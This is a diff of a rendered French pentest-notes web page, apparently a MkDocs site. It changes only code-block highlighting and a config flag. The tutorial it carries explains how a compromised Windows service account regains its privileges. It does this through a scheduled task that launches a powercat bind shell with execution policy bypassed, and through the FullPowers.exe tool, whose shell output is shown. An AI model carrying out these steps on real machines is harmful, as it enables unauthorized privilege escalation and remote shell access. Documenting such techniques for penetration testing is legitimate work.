@@ -7685,24 +7685,24 @@
 <p>Ce qui fait que nous pouvons éventuellement avoir un contrôle de ce compte, mais sans ses privilèges associés.</p>
 <h3 id="reactiver-les-privileges-avec-une-tache-planifiee">Réactiver les privilèges avec une tâche planifiée</h3>
 <p>L'astuce consiste en la création d'une tâche planifiée avec ce compte (par exemple l'exécution d'un nouveau reverse-shell) : la tâché planifiée se lancera avec le compte de service "nature peinture" et donc avec ses privilèges habituels.</p>
-<pre><code class="language-powershell">$TaskAction = New-ScheduledTaskAction -Execute &quot;powershell.exe&quot; -Argument &quot;-Exec Bypass -Command `&quot;. C:\TOOLS\powercat.ps1; powercat -l -p 7002 -ep`&quot;&quot;
-</code></pre>
-<pre><code class="language-powershell">Register-ScheduledTask -Action $TaskAction -TaskName &quot;SomeTask&quot;
-Start-ScheduledTask -TaskName &quot;SomeTask&quot;
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nv">$TaskAction</span> <span class="p">=</span> <span class="nb">New-ScheduledTaskAction</span> <span class="n">-Execute</span> <span class="s2">&quot;powershell.exe&quot;</span> <span class="n">-Argument</span> <span class="s2">&quot;-Exec Bypass -Command </span><span class="se">`&quot;</span><span class="s2">. C:\TOOLS\powercat.ps1; powercat -l -p 7002 -ep</span><span class="se">`&quot;</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">Register-ScheduledTask</span> <span class="n">-Action</span> <span class="nv">$TaskAction</span> <span class="n">-TaskName</span> <span class="s2">&quot;SomeTask&quot;</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nb">Start-ScheduledTask</span> <span class="n">-TaskName</span> <span class="s2">&quot;SomeTask&quot;</span>
+</span></code></pre></div>
 <h3 id="reactiver-les-privileges-avec-fullpowersexe">Réactiver les privilèges avec FullPowers.exe</h3>
 <p>https://github.com/itm4n/FullPowers</p>
-<pre><code class="language-powershell">c:\TOOLS&gt;FullPowers -c &quot;powershell -ep Bypass&quot;
-[+] Successfully created scheduled task. PID=9028
-[+] CreateProcessAsUser() OK
-Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.
-
-Try the new cross-platform PowerShell https://aka.ms/pscore6
-
-PS C:\WINDOWS\system32&gt; Get-ExecutionPolicy
-Bypass
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">c</span><span class="p">:\</span><span class="n">TOOLS</span><span class="p">&gt;</span><span class="n">FullPowers</span> <span class="n">-c</span> <span class="s2">&quot;powershell -ep Bypass&quot;</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="p">[+]</span> <span class="n">Successfully</span> <span class="n">created</span> <span class="n">scheduled</span> <span class="n">task</span><span class="p">.</span> <span class="n">PID</span><span class="p">=</span><span class="n">9028</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="p">[+]</span> <span class="n">CreateProcessAsUser</span><span class="p">()</span> <span class="n">OK</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">Windows</span> <span class="n">PowerShell</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="k">Try</span> <span class="n">the</span> <span class="n">new</span> <span class="n">cross-platform</span> <span class="n">PowerShell</span> <span class="n">https</span><span class="p">://</span><span class="n">aka</span><span class="p">.</span><span class="n">ms</span><span class="p">/</span><span class="n">pscore6</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">WINDOWS</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">Get-ExecutionPolicy</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="n">Bypass</span>
+</span></code></pre></div>
 
 
 
@@ -7749,7 +7749,7 @@ Bypass
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
